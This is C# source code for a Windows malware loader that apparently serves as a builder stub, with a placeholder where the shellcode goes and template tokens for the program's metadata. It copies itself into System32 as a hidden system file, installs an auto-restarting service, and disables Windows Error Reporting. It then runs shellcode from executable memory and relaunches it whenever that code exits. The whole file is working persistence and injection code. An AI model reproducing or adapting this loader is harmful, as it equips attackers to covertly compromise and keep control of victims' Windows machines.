using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Threading;
using System.Reflection;

[assembly: AssemblyTitle("%Title%")]
[assembly: AssemblyDescription("%Des%")]
[assembly: AssemblyCompany("%Company%")]
[assembly: AssemblyProduct("%Product%")]
[assembly: AssemblyCopyright("%Copyright%")]
[assembly: AssemblyTrademark("%Trademark%")]

public class MasonService : ServiceBase
{
    private Thread execTh;
    private Thread monTh;
    private bool run;
    private static IntPtr scPtr = IntPtr.Zero;
    private static IntPtr scTh = IntPtr.Zero;
    private static readonly string instName = @"Global\MasonServiceInstance";
    private static Mutex instMtx;
    private static bool isMain = false;

    public MasonService()
    {
        ServiceName = Freemasonry.serviceName;
        CanStop = true;
        CanPauseAndContinue = false;
        AutoLog = false;
        run = true;
    }

    protected override void OnStart(string[] args)
    {
        if (!LockInst())
        {
            Environment.Exit(0);
            return;
        }

        DisableWer();

        monTh = new Thread(new ThreadStart(Mon));
        monTh.IsBackground = true;
        monTh.Start();

        execTh = new Thread(new ThreadStart(Loop));
        execTh.IsBackground = true;
        execTh.Start();
    }

    protected override void OnStop()
    {
        run = false;
        isMain = false;

        if (execTh != null && execTh.IsBackground)
        {
            execTh.Join(3000);
        }

        if (monTh != null && monTh.IsBackground)
        {
            monTh.Join(3000);
        }

        CleanAll();
        UnlockInst();
    }

    private bool LockInst()
    {
        try
        {
            bool created;
            instMtx = new Mutex(true, instName, out created);
            isMain = created;
            return created;
        }
        catch
        {
            return false;
        }
    }

    private void UnlockInst()
    {
        try
        {
            if (instMtx != null)
            {
                instMtx.ReleaseMutex();
                instMtx.Close();
                instMtx = null;
            }
        }
        catch { }
    }

    private void Mon()
    {
        int n = 0;
        while (run)
        {
            n++;
            try
            {
                CheckSc();
                if (!isMain)
                {
                    Stop();
                    return;
                }
            }
            catch { }
            Thread.Sleep(1000);
        }
    }

    private void Loop()
    {
        RunOnce();
        while (run)
        {
            Thread.Sleep(1000);
        }
    }

    private void RunOnce()
    {
        try
        {
            byte[] sc = LoadShellcode();
            if (sc == null || sc.Length == 0)
            {
                return;
            }

            scPtr = VirtualAlloc(
                IntPtr.Zero,
                (uint)sc.Length,
                AllocationType.Commit | AllocationType.Reserve,
                MemoryProtection.ExecuteReadWrite);

            if (scPtr == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(sc, 0, scPtr, sc.Length);

            IntPtr thId;
            scTh = CreateThread(
                IntPtr.Zero,
                0,
                scPtr,
                IntPtr.Zero,
                0,
                out thId);

            if (scTh == IntPtr.Zero)
            {
                return;
            }

            uint old;
            VirtualProtect(scPtr, (uint)sc.Length,
                MemoryProtection.Execute, out old);

            MonSc();
        }
        catch { }
    }

    private void MonSc()
    {
        int n = 0;
        while (run && n < 3600)
        {
            n++;
            try
            {
                if (scTh == IntPtr.Zero) break;

                uint code;
                if (GetExitCodeThread(scTh, out code))
                {
                    if (code != 0x103)
                    {
                        break;
                    }
                }
            }
            catch { }
            Thread.Sleep(1000);
        }
    }

    private void CheckSc()
    {
        try
        {
            if (scTh != IntPtr.Zero)
            {
                uint code;
                if (GetExitCodeThread(scTh, out code))
                {
                    if (code != 0x103)
                    {
                        CleanThr();
                        if (isMain)
                        {
                            RunOnce();
                        }
                    }
                }
            }
        }
        catch { }
    }

    private void CleanAll()
    {
        CleanThr();
    }

    private void CleanThr()
    {
        try
        {
            if (scTh != IntPtr.Zero)
            {
                uint code;
                if (GetExitCodeThread(scTh, out code) && code == 0x103)
                {
                    TerminateThread(scTh, 0);
                }
                CloseHandle(scTh);
                scTh = IntPtr.Zero;
            }

            if (scPtr != IntPtr.Zero)
            {
                VirtualFree(scPtr, 0, FreeType.Release);
                scPtr = IntPtr.Zero;
            }
        }
        catch { }
    }

    public byte[] LoadShellcode()
    {
        try
        {
            string shellcodeString = "shellcode";

            return shellcodeString
                .Split(',')
                .Select(x => Convert.ToByte(x.Trim().Replace("0x", ""), 16))
                .ToArray();
        }
        catch
        {
            return new byte[0];
        }
    }

    private void DisableWer()
    {
        try
        {
            SetErrorMode(0x0001 | 0x0002 | 0x0004);
            try
            {
                Microsoft.Win32.Registry.SetValue(
                    @"HKEY_CURRENT_USER\Software\Microsoft\Windows\Windows Error Reporting",
                    "Disabled", 1, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch { }
            try
            {
                Microsoft.Win32.Registry.SetValue(
                    @"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\Windows Error Reporting",
                    "Disabled", 1, Microsoft.Win32.RegistryValueKind.DWord);
            }
            catch { }
            Environment.SetEnvironmentVariable("WER_FAULT_REPORTING", "0",
                EnvironmentVariableTarget.Process);
        }
        catch { }
    }

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        AllocationType flAllocationType,
        MemoryProtection flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualFree(
        IntPtr lpAddress,
        uint dwSize,
        FreeType dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool VirtualProtect(
        IntPtr lpAddress,
        uint dwSize,
        MemoryProtection flNewProtect,
        out uint lpflOldProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool GetExitCodeThread(IntPtr hThread, out uint lpExitCode);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool TerminateThread(IntPtr hThread, uint dwExitCode);

    [DllImport("kernel32.dll")]
    private static extern int SetErrorMode(int wMode);

    [Flags]
    private enum AllocationType
    {
        Commit = 0x1000,
        Reserve = 0x2000
    }

    [Flags]
    private enum MemoryProtection
    {
        Execute = 0x10,
        ExecuteRead = 0x20,
        ExecuteReadWrite = 0x40,
        ReadWrite = 0x04
    }

    [Flags]
    private enum FreeType
    {
        Release = 0x8000
    }
}

public class Freemasonry
{
    public static readonly string serviceName = GetServiceNameFromExe();

    private static string GetServiceNameFromExe()
    {
        try
        {
            string system32Path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                "System32");

            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string currentExeName = Path.GetFileName(exePath);
            string system32ExePath = Path.Combine(system32Path, currentExeName);

            string fileName;

            if (File.Exists(system32ExePath))
            {
                fileName = Path.GetFileNameWithoutExtension(system32ExePath);
            }
            else
            {
                fileName = Path.GetFileNameWithoutExtension(exePath);
            }

            string name = new string(fileName.Where(c =>
                char.IsLetterOrDigit(c) || c == '_' || c == '-').ToArray());

            if (string.IsNullOrEmpty(name))
                name = "MasonService";

            if (!char.IsLetter(name[0]))
                name = "S_" + name;

            if (name.Length > 80)
                name = name.Substring(0, 80);

            return name;
        }
        catch
        {
            return "MasonService";
        }
    }

    static void Main(string[] args)
    {
        string name = GetServiceNameFromExe();

        string system32Path = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Windows),
            "System32");

        string exePath = Process.GetCurrentProcess().MainModule.FileName;
        string currentExeName = Path.GetFileName(exePath);
        string targetPath = Path.Combine(system32Path, currentExeName);

        if (!File.Exists(targetPath))
        {
            File.Copy(exePath, targetPath, true);
            File.SetAttributes(targetPath, FileAttributes.Hidden | FileAttributes.System);
            Process.Start(targetPath);
            Environment.Exit(0);
            return;
        }

        bool svcMode = args.Length > 0 && args[0] == "/service";

        if (Environment.UserInteractive && !svcMode)
        {
            RunInstaller(name);
        }
        else
        {
            RunAsService(name);
        }
    }

    static void RunInstaller(string name)
    {
        try
        {
            string system32Path = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.Windows),
                "System32");

            string exePath = Process.GetCurrentProcess().MainModule.FileName;
            string currentExeName = Path.GetFileName(exePath);
            string bin = Path.Combine(system32Path, currentExeName);

            RunSC("stop " + name);
            Thread.Sleep(2000);
            RunSC("delete " + name);
            Thread.Sleep(2000);

            RunSC("create " + name + " binPath= \"" + bin + " /service\" type= own start= auto");
            RunSC("description " + name + " \"Mason Stable Service (Single Instance)\"");
            RunSC("failure " + name + " reset= 3600 actions= restart/10000");

            RunSC("start " + name);
        }
        catch { }
    }

    static void RunAsService(string name)
    {
        try
        {
            MasonService svc = new MasonService();
            svc.ServiceName = name;

            ServiceBase[] list = new ServiceBase[]
            {
                svc
            };
            ServiceBase.Run(list);
        }
        catch { }
    }

    static void RunSC(string args)
    {
        try
        {
            Process p = new Process();
            ProcessStartInfo si = new ProcessStartInfo
            {
                FileName = "sc.exe",
                Arguments = args,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false,
                RedirectStandardOutput = true
            };
            p.StartInfo = si;
            p.Start();
            p.WaitForExit(5000);
        }
        catch { }
    }
}
